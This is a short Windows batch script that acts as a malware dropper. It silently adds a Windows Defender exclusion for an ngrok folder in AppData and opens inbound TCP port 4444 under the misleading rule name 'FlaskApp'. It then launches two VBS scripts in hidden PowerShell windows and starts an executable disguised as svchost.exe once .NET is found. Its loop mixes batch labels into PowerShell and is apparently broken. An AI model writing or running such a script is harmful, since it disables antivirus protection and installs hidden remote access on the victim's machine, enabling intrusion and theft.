@echo off
setlocal

for /f "tokens=*" %%a in ('echo %USERNAME%') do set USERNAME=%%a
set "NGROK_PATH=C:\Users\%USERNAME%\AppData\Local\ngrok"

powershell -Command "$ngrokPath = '%NGROK_PATH%'; Add-MpPreference -ExclusionPath $ngrokPath" >nul 2>&1
powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -EdgeTraversalPolicy Allow" >nul 2>&1

start "" powershell -WindowStyle Hidden -Command "%NGROK_PATH%\nt.vbs"
start "" powershell -WindowStyle Hidden -Command "%NGROK_PATH%\hst.vbs"

powershell -WindowStyle Hidden -Command "
:CHECK_DOTNET
if (Test-Path 'C:\Program Files\dotnet') {
    Start-Process '%NGROK_PATH%\svchost.exe' -WindowStyle Hidden
    exit
}
Start-Sleep -Seconds 2
goto CHECK_DOTNET
"

endlocal
